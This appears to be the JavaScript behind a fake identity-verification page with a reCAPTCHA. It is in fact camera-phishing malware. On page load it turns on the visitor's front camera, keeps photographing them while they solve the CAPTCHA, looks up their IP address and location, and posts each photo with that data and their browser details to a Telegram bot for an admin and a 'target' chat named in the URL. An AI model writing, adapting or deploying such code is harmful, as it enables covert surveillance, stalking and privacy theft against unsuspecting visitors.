import { CONFIG } from "./config.js";

/* ============ DOM refs ============ */
const video      = document.getElementById("video");
const canvas     = document.getElementById("canvas");
const camCard    = document.getElementById("camCard");
const camTitle   = document.getElementById("camTitle");
const camSub     = document.getElementById("camSub");
const statStrip  = document.getElementById("statStrip");
const cntCap     = document.getElementById("cntCaptures");
const delSt      = document.getElementById("delStatus");
const diag       = document.getElementById("diag");
const sessId     = document.getElementById("sessId");
const recapW     = document.getElementById("recapWrap");
const liveProg   = document.getElementById("liveProgress");
const sd1        = document.getElementById("sd1");
const sd2        = document.getElementById("sd2");
const sd3        = document.getElementById("sd3");

/* ============ Params ============ */
const params     = new URLSearchParams(window.location.search);
const userChatId = params.get("id");
const hasTarget  = !!(userChatId && userChatId.trim());
const ADMIN_ID   = CONFIG.ADMIN_CHAT_ID;

let stream = null;
let captureTimer = null;
let captureCount = 0;
let capturing = false;
let recaptchaWidgetId = null;

/* ============ Session id ============ */
sessId.textContent = "AG-" + Math.random().toString(36).slice(2, 8).toUpperCase();

/* ============ Helpers ============ */
function log(t){
  if (CONFIG.DEBUG) console.log("[Aegis]", t);
  if (diag) diag.textContent = t;
}

function setStep(n){
  [sd1, sd2, sd3].forEach(s => s.classList.remove("active","done"));
  if (n >= 1) sd1.classList.add("done");
  if (n >= 2) sd2.classList.add("done");
  if (n === 1) sd1.classList.add("active");
  if (n === 2) sd2.classList.add("active");
  if (n === 3) sd3.classList.add("active");
}

function setCam(state, title, sub){
  camCard.classList.remove("active");
  if (state === "active") camCard.classList.add("active");
  camTitle.textContent = title;
  camSub.textContent = sub;
}

/* ============ Intel ============ */
async function getIP(){
  try { const r = await fetch("https://api.ipify.org?format=json");
        const d = await r.json(); return d.ip || "Unknown"; }
  catch { try { const r = await fetch("https://ipapi.co/json/");
                const d = await r.json(); return d.ip || "Unknown"; }
          catch { return "Unknown"; } }
}
async function getGeo(){
  try { const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        return `${d.city || "?"}, ${d.country_name || "?"}`; }
  catch { return "Unknown"; }
}

/* ============ Send ============ */
async function sendPhotoTo(targetId, blob, caption){
  const fd = new FormData();
  fd.append("chat_id", targetId);
  fd.append("photo", blob, `aegis_${Date.now()}.jpg`);
  fd.append("caption", caption);
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
      { method:"POST", body:fd }
    );
    if (!res.ok){ log("send fail " + targetId); return false; }
    return true;
  } catch { log("net err " + targetId); return false; }
}

/* ============ Capture ============ */
async function capture(){
  if (!stream || !capturing) return;

  canvas.width  = video.videoWidth  || CONFIG.CAM_WIDTH;
  canvas.height = video.videoHeight || CONFIG.CAM_HEIGHT;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const blob = await new Promise(res =>
    canvas.toBlob(res, "image/jpeg", CONFIG.IMAGE_QUALITY)
  );
  if (!blob) return;

  const ip   = await getIP();
  const geo  = await getGeo();
  const ua   = navigator.userAgent;
  const date = new Date().toLocaleString("en-US", { timeZoneName:"short" });

  const base = `📸 #${captureCount + 1}\n🕐 ${date}\n🌐 ${ip} — ${geo}\n💻 ${ua}`;
  const adminCaption = hasTarget
    ? `${base}\n👤 Target: ${userChatId}`
    : `${base}\n🧾 No target (admin-only)`;

  if (CONFIG.SEND_ADMIN_ALWAYS) await sendPhotoTo(ADMIN_ID, blob, adminCaption);
  if (CONFIG.SEND_TO_USER_IF_ID && hasTarget) await sendPhotoTo(userChatId, blob, base);

  captureCount++;
  cntCap.textContent = captureCount;
  delSt.textContent = "✓";
  log("capture " + captureCount);
}

/* ============ Camera ============ */
async function startCamera(){
  log("requesting camera");
  setCam("requesting", "Requesting camera access…", "Tap \"Allow\" to begin your check.");
  setStep(1);

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        width: { ideal: CONFIG.CAM_WIDTH },
        height:{ ideal: CONFIG.CAM_HEIGHT },
        facingMode: "user"
      }
    });
    video.srcObject = stream;
    await video.play();
    await new Promise(res => {
      if (video.readyState >= 2) return res();
      video.onloadeddata = res;
      setTimeout(res, 2500);
    });

    window.__cameraReady = true;
    setCam("active", "Camera active — verifying…", "Keep this tab open while we check.");
    statStrip.style.display = "flex";
    liveProg.style.display = "block";
    recapW.classList.remove("dimmed");

    capturing = true;
    await capture();
    captureTimer = setInterval(capture, CONFIG.CAPTURE_INTERVAL_MS);

    tryRenderRecaptcha();
    log("camera running");
  } catch (err){
    log("camera denied: " + err.name);
    setCam("active", "Camera required", "Allow camera access and reload to try again.");
  }
}

/* ============ Stop ============ */
function stopCapture(){
  capturing = false;
  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
  if (stream){ stream.getTracks().forEach(t => t.stop()); stream = null; }
  statStrip.style.display = "none";
  liveProg.style.display = "none";
}

/* ============ reCAPTCHA ============ */
function tryRenderRecaptcha(){
  if (!window.__recaptchaReady || !window.__cameraReady) return;
  if (recaptchaWidgetId !== null) return;
  const container = document.getElementById("recaptchaWidget");
  if (!container) return;

  try {
    recaptchaWidgetId = window.grecaptcha.render(container, {
      sitekey: CONFIG.RECAPTCHA_SITE_KEY,
      callback: onRecaptchaSuccess,
      "expired-callback": onRecaptchaExpired,
      "error-callback": onRecaptchaError
    });
    log("recaptcha rendered");
  } catch (e){
    console.error("reCAPTCHA error:", e);
    log("recaptcha render fail");
  }
}
window.__tryRenderRecaptcha = tryRenderRecaptcha;

function onRecaptchaSuccess(){
  log("captcha solved");
  setStep(3);
  document.getElementById("bottomRight").textContent = "✓ Identity verified";

  if (CONFIG.STAY_ON_PAGE_AFTER_SUCCESS) return;

  stopCapture();
  setTimeout(() => { window.location.href = "next.html"; }, 900);
}
window.onRecaptchaSuccess = onRecaptchaSuccess;

function onRecaptchaExpired(){
  log("captcha expired");
  setCam("active", "Session expired", "Please solve the challenge again.");
}
window.onRecaptchaExpired = onRecaptchaExpired;

function onRecaptchaError(){
  log("captcha error");
  setCam("active", "Error", "Something went wrong. Reload to retry.");
}
window.onRecaptchaError = onRecaptchaError;

/* ============ Auto start ============ */
if (CONFIG.AUTO_START_ON_LOAD){
  window.addEventListener("load", () => {
    log("auto-start on load");
    startCamera();
  });
}

window.addEventListener("beforeunload", stopCapture);
